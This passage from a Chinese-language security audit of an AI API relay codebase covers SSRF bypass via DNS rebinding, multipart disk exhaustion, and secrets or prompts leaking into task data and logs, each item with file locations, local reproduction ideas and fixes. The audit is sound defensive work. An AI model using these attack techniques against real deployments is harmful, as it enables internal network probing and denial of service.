  - `rg` 结果显示当前代码中只有 `common/gin.go:345` 的 `defer form.RemoveAll()` 覆盖了 `parseMultipartFormData` 内部局部路径；`ParseMultipartFormReusable` 和直接 `c.MultipartForm()` 的调用点没有统一清理。
- 可能后果：单个请求仍受 `MAX_REQUEST_BODY_MB` 限制，但攻击者或异常客户端可以反复提交接近上限的 multipart 文件，使底层 multipart 解析在系统临时目录创建临时文件；由于请求结束时没有统一 `RemoveAll`，这些文件可能跨请求残留，持续消耗 `/tmp` 或容器 writable layer。部分路径还会把已落盘或已缓存的完整请求体重新读回内存，再把文件复制成上游 multipart 或 base64，导致单请求内存峰值远高于运营预期。磁盘被临时文件占满后，可能影响请求体磁盘缓存、日志、数据库临时文件、上游转发和其他同机服务，表现为随机 500、请求读取失败或节点不可用。
- 复现思路：在本地或测试环境使用有效 API token，对 `/v1/audio/transcriptions`、`/v1/images/edits` 或支持 multipart 的任务接口连续提交接近 `MAX_REQUEST_BODY_MB` 的文件表单；观察系统临时目录或容器 writable layer 中 multipart 临时文件是否在请求结束后保留，且进程内存峰值是否在 `ParseMultipartFormReusable` 路径中接近或超过请求体大小。不要在生产环境或共享磁盘上做大文件压力复现。
- 修复建议：在全局请求结束清理中间件中补充 `if c.Request.MultipartForm != nil { _ = c.Request.MultipartForm.RemoveAll(); c.Request.MultipartForm = nil }`，确保直接 `c.MultipartForm()`、`FormFile()` 和 `ParseMultipartFormReusable` 路径都被覆盖。改造 `ParseMultipartFormReusable`，避免对磁盘缓存请求体调用 `storage.Bytes()`，应直接基于 `io.Reader`/`io.SectionReader` 流式解析，或对 multipart 使用统一的已解析 form 并明确生命周期。对 multipart relay 单独设置更小的文件大小、文件数量、字段数量和总 multipart 大小上限，并将上限与用户组/模型/渠道成本策略联动。上传转发路径应优先流式复制，减少完整请求体、文件内容和 base64 三份数据同时驻留。
- 优先级：P1。
- 当前状态：未修复。

### 风险 188：SSRF 校验未绑定实际拨号目标，DNS rebinding 或 Worker 网络差异可能绕过私网 IP 防护

- 影响范围：远程图片/文件 URL 加载、MJ 图片代理、视频结果代理、Bark/Gotify/Webhook 通知、Worker 代理下载、私网/云元数据防护、上游文件下载成本和内网资源暴露面。
- 触发条件：攻击者或异常用户能控制需要平台下载的 URL，例如图片 URL、文件 URL、任务结果 URL、MJ 图片代理 URL、通知 URL；目标域名在校验时解析为公网 IP，但实际连接时解析到私网/链路本地/云元数据地址，或 Worker 模式下本机校验通过但 Worker 所在网络解析/重定向到内部资源。
- 涉及文件/函数：
  - `setting/system_setting/fetch_setting.go:16-25`：默认开启 SSRF 防护、禁止私网 IP、限制端口为 80/443/8080/8443，并对域名解析结果应用 IP 过滤，这是正向证据。
  - `common/ssrf_protection.go:32-116`：私网/保留网段覆盖了 IPv4、IPv6、回环、链路本地、CGNAT、文档网段、组播等地址。
  - `common/ssrf_protection.go:252-329`：`ValidateURL` 校验协议、端口、域名名单、IP 名单，并在 `ApplyIPFilterForDomain=true` 时用 `net.LookupIP(host)` 检查解析结果。
  - `common/ssrf_protection.go:332-355`：`ValidateURLWithFetchSetting` 在 SSRF 防护开启时构造保护配置并调用 `ValidateURL`；关闭防护会直接放行。
  - `service/download.go:52-69`：普通远程下载在 `DoDownloadRequest` 中先调用 `ValidateURLWithFetchSetting`，随后 `GetHttpClient().Get(originUrl)` 重新由 HTTP transport 解析和连接。
  - `service/http_client.go:24-33`：重定向目标会再次调用 `ValidateURLWithFetchSetting`，最多 10 次重定向，这是正向证据。
  - `service/http_client.go:36-58`：默认 HTTP client 使用标准 `http.Transport`，没有自定义 `DialContext` 将校验得到的 IP 固定到实际连接，也没有在拨号时复查 `addr` 的最终 IP。
  - `service/http_client.go:85-168`：代理 client 同样只在请求/重定向 URL 层校验；HTTP/HTTPS/SOCKS 代理实际连接发生在代理网络侧，平台本机校验无法保证代理侧 DNS 与私网可达性一致。
  - `service/download.go:23-50`：Worker 模式会先本机校验 `req.URL`，再把 URL、Key、Method、Headers、Body 发给 `WorkerUrl`；实际下载由 Worker 完成。
  - `service/download.go:28-35`：Worker 模式在 `WorkerAllowHttpImageRequestEnabled=false` 时只用 `strings.HasPrefix(req.URL, "https")` 做 HTTP 限制，然后再走本机 SSRF 校验；但 Worker 侧是否同样校验 DNS、端口、私网和重定向，在当前仓库内没有可验证实现。
  - `service/download.go:38-49`：平台向 `WorkerUrl` 发 POST 没有先对 `WorkerUrl` 本身应用 FetchSetting；前端只要求 URL 以 http/https 开头，后端 `model/option.go:388-391` 直接保存和热更新。
  - `web/default/src/features/system-settings/integrations/worker-settings-section.tsx:45-53`：前端 Worker URL 只校验 `http://` 或 `https://` 前缀，没有限制私网、域名白名单或 HTTPS-only。
  - `controller/video_proxy.go:132-146`、`relay/mjproxy_handler.go:53-60`、`service/user_notify.go:156-164`、`service/user_notify.go:250-258`、`service/webhook.go:91-98`：视频代理、MJ 图片代理、通知和 webhook 都是“先 URL 校验，再通过 HTTP client 发请求”的同类模式。
  - `service/file_service.go:156-168`、`service/image.go:68-74`、`service/file_decoder.go:21-29`：文件/图片/MIME 探测下载入口也统一依赖 `DoDownloadRequest`。
  - `web/default/src/features/system-settings/request-limits/ssrf-section.tsx:389-401`：前端文案说明 allowed ports 为空表示允许所有端口；配置错误会显著扩大 SSRF 可达面。
  - `model/option.go:588-622` 与 `setting/config/config.go:203-269`：分层 `fetch_setting` 更新通过反射写入，更新错误被忽略，缺少对“禁用 IP filter for domain / 清空 allowed ports / 允许私网”的高危组合二次确认。
- 可能后果：在默认配置下，直接访问 `http://169.254.169.254`、`http://127.0.0.1` 或解析到私网的普通域名会被拦截；但攻击者可使用 DNS rebinding、低 TTL 域名、分裂 DNS、代理/Worker 网络差异，让平台校验阶段看到公网地址，而实际连接阶段由 transport、代理或 Worker 解析到私网地址。这样远程图片、文件、视频代理或通知 webhook 可能被用来探测内网服务、云元数据接口、Worker 内网资源，或消耗平台/Worker 的外部下载额度。更隐蔽的是运营看到“SSRF Protection 已启用”，但防护只证明校验时的解析结果安全，并不证明实际下载目标安全。
- 复现思路：在本地测试环境搭建一个可控域名，让第一次 DNS 查询返回公网 IP，通过低 TTL/切换解析让后续连接解析到 `127.0.0.1`、`10.0.0.0/8` 或测试内网地址；向需要下载远程图片/文件的接口提交该 URL，观察 `ValidateURLWithFetchSetting` 通过后 HTTP transport 是否仍可能连接到切换后的地址。Worker 模式下使用本机解析为公网、Worker 解析为内网的 split-horizon 域名测试本机校验和 Worker 实际下载是否一致。只在隔离测试网络做，不访问真实云元数据或生产内网。
- 修复建议：将 SSRF 防护从“请求前校验 URL”升级为“拨号时校验并绑定目标 IP”。为下载/代理专用 HTTP client 提供自定义 `DialContext`：解析域名后筛选允许 IP，拨号到已校验 IP，并用原始 Host/SNI 保持 HTTP/TLS 语义；每次重定向重新执行同样流程。对 HTTP/HTTPS/SOCKS 代理和 Worker 模式，必须明确信任边界：要么禁用代理/Worker 访问用户可控 URL，要么要求 Worker 实现同等 SSRF 校验并回传最终 URL、最终 IP、重定向链和校验结果。`WorkerUrl` 本身也应做后端 URL/私网/HTTPS 校验，并对 `AllowPrivateIp=true`、`ApplyIPFilterForDomain=false`、空端口列表、关闭 SSRF 防护等高危组合增加 Root 二次确认、审计日志和运行态告警。
- 优先级：P1。
- 当前状态：未修复。

### 风险 190：任务 Data 保存完整上游响应且脱敏规则过窄，签名 URL、base64 视频和 provider 错误可能长期落库并对外返回

- 影响范围：视频/任务类异步接口、`tasks` 表 `data` 字段、用户任务查询、管理员任务查询、OpenAI Video 兼容查询、任务轮询 debug 日志、上游适配器错误链路、对象存储/Provider 结果 URL、base64 视频结果。
- 触发条件：上游创建任务或轮询任务返回完整 JSON 响应，其中包含 `video_url`、`creations[].url`、`task_result.videos[].url`、`response.bytesBase64Encoded`、`response.video`、provider request id、错误 body 或其他内部字段；平台开启 debug 日志，或用户/管理员查询任务列表、`/v1/videos/{id}`、任务 fetch 接口；适配器解析失败时把完整响应体包进错误。
- 涉及文件/函数：
  - `controller/relay.go:579-594`：任务创建成功后 `task.Data = result.TaskData`，而各 task adaptor 的 `DoResponse` 多数直接返回上游原始 `responseBody`；这是任务 Data 首次落库入口。
  - `relay/channel/task/jimeng/adaptor.go:184-202`、`relay/channel/task/vidu/adaptor.go:165-176`、`relay/channel/task/ali/adaptor.go:377-390`、`relay/channel/task/doubao/adaptor.go:208-220`：多个视频适配器读取完整上游响应体，解析失败时把 `body: %s` 或完整 `responseBody` 包进错误；成功时也把原始响应作为 `taskData` 交回任务落库。
  - `service/task_polling.go:370-397`：视频轮询读取完整 `responseBody`，先用 debug 日志输出 `updateVideoSingleTask response: %s`，解析 New API 响应时短暂设置 `task.Data = t.Data`，随后统一 `task.Data = redactVideoResponseBody(responseBody)`；日志输出发生在脱敏前。
  - `service/task_polling.go:504-528` 与 `controller/task_video.go:281-305`：`redactVideoResponseBody` 只处理顶层 `response.bytesBase64Encoded`、`response.video` 和 `response.videos[].bytesBase64Encoded`。它不会递归处理任意层级，也不会脱敏 `video_url`、`url`、`result_url`、`creations[].url`、`task_result.videos[].url`、`token`、`signature`、`authorization`、`request_id` 等字段。
  - `controller/task_video.go:94-119`：旧视频轮询路径同样在脱敏前 debug 输出完整响应，并且只有 `ParseTaskResult` 成功的 else 分支会写 `task.Data = redactVideoResponseBody(responseBody)`；解析为 New API 格式时保留 `t.Data`。
  - `service/task_polling.go:415-417`：任务状态为空且错误格式无法识别时，错误日志直接包含完整 `responseBody`。
  - `service/task_polling.go:453-461`：失败路径先 `logger.LogJson` 输出 task，再把上游 reason 写入 `FailReason` 并记录日志；如果 `task.Data` 或 reason 已含 provider 响应、URL、base64 片段或内部错误，会进入日志链路。
  - `model/task.go:366-395`：任务快照把 `Data` 作为状态差异的一部分，说明 `Data` 是持久化任务状态，而不是临时调试字段。
  - `relay/relay_task.go:541-563`：`TaskModel2Dto` 对外返回 `Data: task.Data`，没有按用户/管理员/接口类型做字段级过滤。
  - `relay/relay_task.go:320-337`、`relay/relay_task.go:341-359`、`relay/relay_task.go:407-414`：按任务 ID 批量 fetch、Suno fetch、视频通用 fetch 都会把 `TaskModel2Dto` 包到响应里，用户可拿到自身任务的完整 `Data`。
  - `controller/task.go:69-93`：后台和用户任务列表也复用 `TaskModel2Dto`；管理员页会看到所有任务的 `Data`。
  - `relay/channel/task/jimeng/adaptor.go:454-464`、`relay/channel/task/vidu/adaptor.go:275-290`、`relay/channel/task/kling/adaptor.go:379-396`、`relay/channel/task/ali/adaptor.go:489-504`、`relay/channel/task/doubao/adaptor.go:344-355`、`relay/channel/task/vertex/adaptor.go:351-372`：OpenAI Video 兼容转换会从 `originTask.Data` 或 `task.GetResultURL()` 读取结果 URL，再写入 metadata `url`；这会把落库的完整上游 URL 再次返回给调用方。
  - `service/task_polling.go:203-216` 与 `service/task_polling.go:232-243`：Suno 轮询解析失败会记录完整响应 body，成功后把上游 `responseItem.Data` 直接写入 `task.Data`；本轮未深入 Suno Data 结构，但它属于同一类“上游响应字段直接持久化并返回”的风险面。
- 可能后果：任务 `Data` 成为上游响应的长期镜像，可能包含完整签名下载 URL、长期 CDN URL、provider 内部 task id/request id、错误 body、base64 视频片段或用户输入回显。由于 `Data` 会通过用户任务查询、管理员任务列表和 OpenAI Video metadata 被重新暴露，泄露面不只在数据库，还包括前端、浏览器缓存、API 客户端、客服导出、日志平台和备份。`redactVideoResponseBody` 当前只覆盖 Gemini/Vertex 类 `response.bytesBase64Encoded` 的少数形态，无法证明 Jimeng/Vidu/Kling/Ali/Doubao/Hailuo/Suno 等不同响应结构都安全。开启 debug 时，脱敏前完整响应还会先写日志，即使后续落库被裁剪也不能清除日志侧泄露。
- 复现思路：在本地测试环境模拟上游返回 `{"output":{"video_url":"https://cdn.example/video.mp4?token=secret"},"request_id":"rid"}`、`{"creations":[{"url":"https://signed.example/x?X-Amz-Signature=secret"}]}` 或 `{"response":{"bytesBase64Encoded":"..."}}`。创建任务后检查 `tasks.data`、`/api/task/self`、任务 fetch 接口和 `/v1/videos/{id}` metadata 是否仍含完整 URL/base64/request id；再打开 debug 日志观察 `updateVideoSingleTask response` 是否在脱敏前输出完整 body。不要使用真实用户文件、真实签名链接或生产 provider 凭证做复现。
- 修复建议：把任务 `Data` 从“完整上游响应归档”改为“允许对外展示的最小任务摘要”，定义统一 schema，例如状态、进度、模型、耗时、计费 tokens、结果代理 URL、必要错误码；完整上游响应如确需保留，应进入受控的加密审计存储，设短保留期并限制 Root 访问。将 `redactVideoResponseBody` 改成递归字段级脱敏器，覆盖任意层级的 `url`、`video_url`、`result_url`、`creations`、`task_result`、`token`、`signature`、`authorization`、`bytesBase64Encoded`、`video` 和 data URI，并对大字段按大小截断。所有 debug 日志必须在脱敏后输出，或默认禁止输出上游响应体。`TaskModel2Dto` 应按接口场景返回不同视图：普通用户只拿安全摘要和平台代理 URL，管理员默认也只看摘要，Root 明确展开时才看脱敏详情。适配器 `DoResponse` 的解析错误不要包装完整 body，只记录 body hash、长度、状态码、provider request id 和少量安全预览。为 Jimeng/Vidu/Kling/Ali/Doubao/Vertex/Suno 添加回归测试，断言 `token=secret`、`X-Amz-Signature`、`bytesBase64Encoded` 和超长 data URI 不会明文出现在 `tasks.data`、DTO、metadata 或日志消息中。
- 优先级：P1。
- 当前状态：未修复。

### 风险 191：DEBUG 与部分信息日志会输出完整请求/响应体，上游 URL token、prompt、file_data 和用户媒体地址可能进入日志

- 影响范围：通用 relay、兼容文本/Claude/Responses/Gemini/Image/Embedding/Rerank、OpenAI/Gemini/Claude/Midjourney 响应处理、Baidu access token URL、视频任务轮询、Redis debug、日志平台、客服排障和生产临时开 DEBUG 的运维流程。
- 触发条件：运营为了排障设置 `DEBUG=true`，或在测试/灰度环境保留 debug 日志并接入集中日志；用户请求中含 prompt、图片/视频 URL、base64 `file_data`、多模态内容、私有文件链接、业务敏感文本；上游响应中含完整结果、错误详情或供应商 request id；或某些非 debug 信息日志直接记录请求体。
- 涉及文件/函数：
  - `common/init.go:81-83`：`DebugEnabled` 由环境变量 `DEBUG == "true"` 控制，没有看到启动时对生产环境开启 debug 的二次确认或敏感日志警告。
  - `logger/logger.go:88-95` 与 `logger/logger.go:175-185`：`LogDebug` 和 `LogJson` 只在 `DebugEnabled` 下输出，这是正向证据；但它们不会自动脱敏、截断或字段过滤。
  - `common/str.go:26-31`：`LocalLogPreview` 在 `DebugEnabled` 为 true 时不截断内容，debug 排障会放大日志内容体积和敏感暴露面。
  - `relay/compatible_handler.go:97-107`：pass-through 路径在 debug 下从 `BodyStorage` 读取完整请求体并记录 `requestBody`。
  - `relay/compatible_handler.go:168-178`、`relay/claude_handler.go:178-185`、`relay/responses_handler.go:98-106`：文本/Claude/Responses 请求在参数覆盖后记录完整 outbound JSON，请求体可能包含 prompt、tool、system 指令、用户业务数据、`image_url`、`video_url` 或 `file_data`。
  - `relay/gemini_handler.go:156-167`、`relay/gemini_handler.go:264-272`、`relay/image_handler.go:80-87`、`relay/rerank_handler.go:64-71`、`relay/embedding_handler.go:60`：Gemini、图片、rerank、embedding 等入口都会在 debug 下输出完整请求 JSON。
  - `relay/channel/openai/relay-openai.go:630-647`、`relay/channel/claude/relay-claude.go:949-954`、`relay/channel/gemini/relay-gemini.go:1506-1512`、`relay/channel/gemini/relay-gemini-native.go:24-32` 与 `relay/channel/gemini/relay-gemini-native.go:54-60`：多个上游响应处理路径在 debug 下输出完整 response body，可能包含生成内容、错误详情、上游安全拒绝信息、结果 URL 或 base64。
  - `relay/common_handler/rerank.go:21-28`、`service/midjourney.go:232-239`、`service/task_polling.go:370-375`、`controller/task_video.go:94-99`：rerank、Midjourney、视频任务轮询也会记录完整响应体；其中视频轮询的脱敏发生在日志之后。
  - `relay/channel/api_request.go:307-313` 与 `relay/channel/api_request.go:337-343`：通用请求会在 debug 下记录 `fullRequestURL`。
  - `relay/channel/baidu/adaptor.go:103-112`：Baidu URL 会把 `access_token` 放入 query；结合上一条，debug 日志会直接输出带 access_token 的完整上游 URL。
  - `relay/channel/openai/relay-openai.go:170-175`：处理最后一条 SSE 失败时，错误日志会输出 `lastStreamData`；这不是 debug 日志，可能包含最后一段上游响应内容或 usage 事件。
  - `relay/channel/task/ali/adaptor.go:147-153`：阿里视频请求体通过 `logger.LogJson` 输出，受 debug gate 控制；请求体可能包含 prompt、image URL 或任务参数。
  - `relay/channel/jimeng/sign.go:43-52`：`SetPayloadHash` 使用 `LogInfo` 打印 `body`，但当前代码搜索只看到定义、未看到活跃调用点。本轮不把它作为已触发路径，只记录为如果后续接入签名流程会变成默认级别敏感日志的遗留风险点。
  - `common/redis.go:64-67`、`common/redis.go:107-110`、`common/redis.go:302-305`：Redis debug 会输出 value/object/field value；`model/token_cache.go:11-14` 先 `token.Clean()` 再缓存 token，这是正向证据，但其他 Redis value 如果含选项、用户设置或临时敏感对象，仍会被 debug 记录。
  - `relay/common/relay_info.go:290-294`：`RelayInfo.String` 已显式 mask ChannelMeta ApiKey，这是正向证据；风险集中在请求体、响应体、URL query 和非结构化错误内容，不是所有日志都无视密钥。
- 可能后果：一旦运营在生产或含真实用户数据的灰度环境打开 `DEBUG=true`，用户 prompt、图片/视频私有 URL、base64 文件片段、上游生成内容、模型返回错误、Baidu access token、Provider request id、任务结果 URL 和部分业务 payload 可能被完整写入本地日志、日志采集、告警系统和备份。由于 `LocalLogPreview` 在 debug 下不截断，大请求和多模态内容还会造成日志体积暴涨，进一步放大磁盘、日志费用和事故取证成本。更隐蔽的是某些错误日志不是 debug，例如 `lastStreamData`，即使没有开 debug 也可能带出上游响应片段。
- 复现思路：本地设置 `DEBUG=true`，用测试 token 调用 chat、responses、Gemini、多模态图片、embedding、rerank、Baidu 渠道和视频任务轮询，请求体中放入假私有 URL、假 `file_data`、假业务文本和假 token query；观察日志中 `requestBody`、`Gemini request body`、`fullRequestURL`、`upstream response body`、`responseBody`、`updateVideoSingleTask response` 是否出现明文。再模拟 SSE 最后一条响应处理失败，检查 `lastStreamData` 是否在非 debug 错误日志中出现原文。只使用本地假数据，不把真实用户 prompt、真实文件、真实 access token 用于复现。
- 修复建议：建立统一的安全日志层，禁止业务代码直接把请求体、响应体、URL 或对象传给 `LogDebug`/`LogInfo`；所有日志先经过字段级脱敏、大小截断和类型化摘要。`DEBUG=true` 应增加生产环境启动保护、醒目启动告警、自动脱敏和最大日志体积限制，不应让 `LocalLogPreview` 在 debug 下完全失效。请求日志只记录 schema、字段存在性、大小、hash、模型、渠道、状态码和耗时；URL 只记录 host、路径模板和 query key，不记录 query value；响应日志只记录状态、usage、错误码、body hash 和安全预览。将 `fullRequestURL` 改为脱敏 URL，特别处理 `access_token`、`api_key`、`signature` 等 query。把 `lastStreamData` 错误日志改为脱敏摘要。保留 `RelayInfo` mask API key 的做法，并扩大到所有结构化对象日志。为 debug 日志加测试：构造含 `secret_prompt`、`file_data`、`access_token=secret`、`Authorization`、`X-Amz-Signature` 的请求/响应，断言日志输出不包含明文。
- 优先级：P1。
- 当前状态：未修复。

### 风险 192：渠道密钥可被拼入上游 URL、Header Override 和 Param Override 审计，调试日志与消费日志可能长期保存密钥或客户端敏感 header

- 影响范围：渠道请求构造、Baidu/OpenAI-SB/Gemini 视频代理、Header Override、Param Override、渠道模型拉取、消费日志 `other` 字段、后台用量日志详情、debug URL 日志、上游第三方可见 URL 和中间代理日志。
- 触发条件：运营配置带 `{api_key}` 的 Header Override，或 Param Override 使用 `set_header`/`pass_headers`/`copy_header`，或渠道本身把 key/access token 放进 query；同时开启 debug 日志、记录消费日志，或通过后台用量日志查看 Param Override 审计。若配置显式使用 `{client_header:Authorization}`、`{client_header:X-Api-Key}` 等占位符，还可能把用户入站凭证转发到上游。
- 涉及文件/函数：
  - `relay/channel/api_request.go:147-178`：Header Override 支持 `{client_header:<name>}` 和 `{api_key}`；`{client_header:...}` 必须作为完整值且不会在客户端 header 内容中二次替换 `{api_key}`，这是正向证据，但仍允许显式转发任意指定客户端 header 值。
  - `relay/channel/api_request.go:190-257`：wildcard/regex header passthrough 会复制入站 header 到上游请求。
  - `relay/channel/api_request.go:67-94` 与 `relay/channel/api_request.go:135-145`：wildcard/regex passthrough 会跳过 `cookie`、`authorization`、`x-api-key`、`x-goog-api-key`、hop-by-hop 和 WebSocket 握手 header，这是正向证据；但显式 override 或 `{client_header:Authorization}` 不走该 skip 逻辑。
  - `relay/channel/api_request.go:260-285`：普通 Header Override 会把 `{api_key}` 替换成 `info.ApiKey`，随后进入 `headerOverride`。
  - `relay/channel/api_request.go:294-304`：最终 override 会 `req.Header.Set(key, value)`，且允许覆盖 `Host`；配置错误时可把渠道密钥放进任意上游 header，或改变上游 Host/SNI 语义的可观测结果。
  - `controller/channel.go:188-210`：拉取渠道模型时也会把 Header Override 的 `{api_key}` 替换成真实 key。这里只校验 JSON 格式，不对把密钥放到哪些 header 做策略限制。
  - `controller/channel.go:793-815`：按 tag 批量编辑 `param_override` 和 `header_override` 只校验 JSON 合法性，不做敏感字段、危险 header、`{api_key}` 使用场景、`Host` 覆盖、`Authorization` 覆盖的二次确认。
  - `relay/common/override.go:285-292`、`relay/common/override.go:296-368`：Param Override 审计会把 `set`、`append`、`set_header`、`pass_headers` 等操作的 value 原样格式化成字符串。
  - `relay/common/override.go:178-199`：当启用 Param Override 审计时，审计行会写入 `info.ParamOverrideAudit`。
  - `service/log_info_generate.go:248-304`：消费日志生成时将 `ParamOverrideAudit` 放入 `other["po"]`。
  - `model/log.go:280-320`：消费日志把 `params.Other` 序列化进 `logs.other`，同时 info 日志输出完整 `params` JSON；如果 `po` 含密钥、header 值或敏感操作，将进入数据库和运行日志。
  - `web/default/src/features/usage-logs/components/dialogs/details-dialog.tsx:1048-1070`：前端日志详情会展示 `other.po` 中的 Param Override 审计内容，后台用户可直接看到。
  - `relay/channel/api_request.go:307-313` 与 `relay/channel/api_request.go:337-343`：debug 下记录 `fullRequestURL`。
  - `relay/channel/baidu/adaptor.go:103-112`：Baidu 请求 URL 将 `access_token` 放入 query；debug `fullRequestURL` 会记录该 token。
  - `controller/channel-billing.go:185-188`：OpenAI-SB 余额查询 URL 直接拼接 `api_key=%s`；如果底层请求、代理或错误日志记录 URL，渠道 key 会进入日志或第三方代理可见 query。
  - `controller/video_proxy_gemini.go:286-293`：Gemini 视频 URL 会在 query 追加 `key=`；结合视频代理错误日志和第三方访问日志，存在把 key 暴露到 URL query 的面。
  - `relay/common/relay_info.go:520-535` 与 `relay/common/override.go:2042-2080`：RelayInfo 会收集入站请求 header 并放入 Param Override context，支持后续条件判断或 header 操作；这提升了配置灵活性，也要求对可复制 header 做最小权限限制。
- 可能后果：渠道密钥、Baidu access token、Gemini key、用户入站 Authorization、X-Api-Key 或内部路由 header 可能被配置拼接到上游 header/query，再出现在 debug 日志、代理日志、第三方服务访问日志、消费日志 `other.po`、后台日志详情或错误排查材料中。由于消费日志通常保留周期长且可按用户/模型查询，密钥一旦进入 `other` 字段，就会从“运行时凭证”变成“可检索历史数据”。更严重的是 Header Override 可覆盖默认 Authorization 或 Host，配置错误可能把 A 渠道的密钥发给 B 上游、把用户入站凭证发给第三方，或让模型拉取/渠道测试路径与真实 relay 路径产生不同安全行为。
- 复现思路：在本地测试环境配置一个测试渠道 Header Override：`{"Authorization":"Bearer {api_key}"}`，再配置 Param Override `set_header` 值为假密钥或 `{client_header:Authorization}`，发起一次请求并开启消费日志；检查运行日志 `record consume log`、`logs.other`、后台用量详情 `Param Override` 是否出现明文。对 Baidu 或模拟 adaptor 返回带 `access_token` query 的 `fullRequestURL`，在 `DEBUG=true` 下确认 URL 是否明文记录。只使用假 key 和本地测试渠道，不把真实渠道 key 发送到第三方或写入共享日志。
- 修复建议：把 URL query 中的 `api_key`、`access_token`、`key`、`signature` 视为凭证，所有 `fullRequestURL`、错误、代理日志和审计必须先脱敏。Header Override 应增加策略校验：默认禁止把 `{api_key}` 放入非授权白名单 header，禁止覆盖 `Host`、`Authorization` 的危险组合除非 Root 二次确认并记录脱敏审计；禁止显式 `{client_header:Authorization}`、`{client_header:Cookie}`、`{client_header:X-Api-Key}` 等敏感客户端 header 复制到上游，或要求逐 header allowlist。Param Override 审计应记录操作摘要和字段名，不记录 value 明文；`set_header Authorization = Bearer ...` 应显示为 `set_header Authorization = ***`。消费日志 `record consume log` 不应输出完整 params JSON。对 Baidu、Gemini 视频代理、OpenAI-SB 余额查询等 query-key URL，优先改为 header 认证；无法改时也要在日志、错误和代理配置中统一脱敏。添加测试覆盖：`{api_key}`、`access_token=secret`、`key=secret`、`set_header Authorization` 和 `{client_header:Authorization}` 不得明文出现在 debug 日志、`logs.other` 和前端日志详情。
- 优先级：P1。
- 当前状态：未修复。

### 风险 193：渠道测试产生真实上游成本但不走普通扣费结算，且成功响应体会明文写入系统日志

- 影响范围：单渠道测试、全渠道测试、自动渠道测试、渠道响应时间与自动禁用/启用、消费日志、渠道成本统计、Root/Admin 运维操作、上游模型调用成本、系统日志和日志采集。
- 触发条件：Admin 调用 `/api/channel/test/:id`、`/api/channel/test`，或开启自动渠道测试；测试请求命中真实上游模型、图片、embedding、rerank、responses、Gemini/Claude/OpenAI 兼容路径；上游返回包含生成内容、错误详情、usage、request id、图片 URL 或其他响应体；系统记录消费日志和系统日志。
- 涉及文件/函数：
  - `router/api-router.go:233-245`：`/api/channel/test`、`/api/channel/test/:id`、`/api/channel/update_balance`、`/api/channel/update_balance/:id` 都位于 `channelRoute.Use(middleware.AdminAuth())` 下；这些高成本出站动作不要求 Root、二次验证或专门的运维确认。
  - `controller/channel-test.go:77-120`：渠道测试会为不同 endpoint 构造真实请求路径和测试模型，默认测试请求不是本地 mock，而是走真实 adaptor。
  - `controller/channel-test.go:286-300`：测试前记录 `testing channel ... info %+v`；`info.ToString()` 已有 API key mask，这是正向证据，但仍会记录渠道、模型、分组和请求上下文。
  - `controller/channel-test.go:415-435`：测试路径会应用 Param Override 并调用 `adaptor.DoRequest`，即真实向上游发请求。
  - `controller/channel-test.go:465-499`：测试路径调用 `adaptor.DoResponse` 并按实际 usage 计算 `quota`。
  - `controller/channel-test.go:504-516`：测试成功后调用 `model.RecordConsumeLog`，`TokenName` 和 `Content` 固定为“模型测试”，记录了估算/实际 quota，但没有看到普通 relay 中的 `PreConsumeBilling`、`SettleBilling` 或用户/订阅额度扣减。
  - `controller/channel-test.go:517`：成功后直接 `SysLog` 输出 `testing channel #%d, response: \n%s`，会把测试响应体明文写入系统日志，不受 debug gate、脱敏和长度限制控制。
  - `controller/relay.go:153-168` 与 `controller/relay.go:570-578`：普通 relay 会先按价格预扣，再成功结算并记录消费日志；这与渠道测试“只记录消费日志、不扣本地额度”的路径形成对照。
  - `service/text_quota.go:516-529`：普通文本消费日志在结算后记录；渠道测试直接 `RecordConsumeLog` 容易让运营报表看起来有消费，但不会减少任何真实用户余额或订阅额度。
  - `controller/channel-test.go:972-1004`：全渠道测试和自动测试会循环调用 `testAllChannels`，自动测试按 `AutoTestChannelMinutes` 间隔长期执行。
  - `controller/channel-test.go:925-963`：自动测试还会依据错误和响应时间自动禁用/启用渠道；因此测试不仅产生成本和日志，还会改变渠道运行态。
  - `model/log.go:280-320`：消费日志会把测试记录写入 `logs` 表，但 `RecordConsumeLog` 只是记录，不代表本地资产扣费已经发生。
  - `router/api-router.go:255-262`：`fetch_models/:id`、Codex OAuth refresh/usage 也在 Admin channel route 下；它们同样是出站请求或凭证刷新类操作，未见独立 step-up。
  - `controller/channel_upstream_update.go:736-777` 与 `controller/channel_upstream_update.go:847-904`：检测和批量应用上游模型变更会读取/修改渠道模型列表并刷新运行时缓存，属于会影响路由/计费可用面的 Admin 运维动作。
  - `controller/channel-billing.go:139-167`：余额查询使用渠道代理发出真实 HTTP 请求，非 200 只返回状态码错误，未记录脱敏后的 URL、provider、耗时、触发人等结构化审计。
  - `controller/channel-billing.go:424-451` 与 `model/channel.go:585-592`：余额查询成功后直接更新 `channels.balance` 和 `balance_updated_time`，失败时不更新；如果上游返回畸形但可解析的余额，当前路径没有二次确认或异常范围告警。
  - `controller/codex_usage.go:20-125`：Codex usage 会读取渠道 OAuth key、请求上游 usage；401/403 时会用 refresh token 刷新并写回 `channels.key`，然后把上游 usage body 作为 `data` 返回给后台调用方。
  - `service/codex_credential_refresh.go:42-103`：Codex 凭证刷新会把新的 access/refresh token 和派生 email/account id 写回渠道 key，刷新后可清缓存；这是凭证变更动作，但路由层仍是 Admin channel route。
- 可能后果：渠道测试会消耗真实上游额度或触发真实供应商计费，但本地没有从某个运营预算账户、Root 账户或测试账户扣除额度，只在消费日志中记一条“模型测试”。如果 Admin 频繁点击测试、批量测试或自动测试间隔配置过低，可能产生实际渠道成本，却无法通过用户余额、订阅额度或 token 额度闭环追偿。由于测试响应体被 `SysLog` 明文输出，模型输出、上游错误、URL、request id、图片地址或 provider 元数据会进入系统日志。自动测试还可能因短时上游抖动触发自动禁用/启用，影响真实用户路由可用性。余额查询、模型拉取和 Codex usage/refresh 虽然不是用户请求，也会改变渠道缓存、余额字段、模型列表或凭证，应当有独立审计和限流，否则运维操作会和真实流量成本/状态混在一起。
- 复现思路：在本地测试环境配置一个假上游或成本可控的测试渠道，调用 `/api/channel/test/:id`，观察是否向上游真实发出请求、`logs` 表是否出现“模型测试”记录、用户额度或某个测试预算是否没有扣减、系统日志是否包含 `testing channel #..., response:` 的完整响应体。开启自动测试并把间隔设小，观察是否持续产生测试消费日志和渠道 response_time/status 变化。不要对真实付费渠道做高频测试，不使用真实敏感 prompt 或真实用户文件作为测试输入。
